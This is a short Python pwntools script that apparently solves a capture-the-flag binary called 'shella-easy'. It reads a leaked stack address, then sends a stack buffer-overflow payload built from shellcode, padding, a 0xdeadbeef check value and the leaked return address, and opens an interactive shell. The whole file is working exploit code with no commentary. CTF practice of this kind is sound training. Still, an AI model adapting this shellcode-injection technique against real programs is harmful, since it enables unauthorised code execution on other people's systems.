#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./shella-easy',checksec=False)
context.arch = 'i386'
shellcode = asm(shellcraft.sh())
io = process()

io.recvuntil(b'have a ')
leak = int(io.recv().split(b' ')[0],16)

payload = b''
payload += shellcode
payload += b'A'*(0x40 - len(shellcode))
payload += pack(0xdeadbeef)
payload += b'B'*0x8
payload += pack(leak)

io.sendline(payload)
io.interactive()

